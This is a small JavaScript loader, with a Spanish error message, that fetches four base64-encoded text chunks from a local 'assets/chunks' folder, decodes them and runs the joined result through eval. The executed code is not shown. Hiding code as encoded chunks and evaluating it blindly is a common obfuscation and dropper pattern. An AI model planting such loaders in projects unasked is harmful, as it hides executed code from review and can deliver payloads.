(()=>{
  const files=["preprod-001.txt","preprod-002.txt","preprod-003.txt","preprod-004.txt"];
  const decoder=new TextDecoder("utf-8");
  const decodeChunk=encoded=>{
    const binary=atob(encoded.trim());
    const bytes=Uint8Array.from(binary,char=>char.charCodeAt(0));
    return decoder.decode(bytes);
  };

  let source="";
  for(const name of files){
    const request=new XMLHttpRequest();
    request.open("GET","assets/chunks/"+name,false);
    request.send(null);
    if(request.status!==200&&request.status!==0) throw new Error("No se pudo cargar "+name);
    source+=decodeChunk(request.responseText);
  }

  (0,eval)(source);
})();
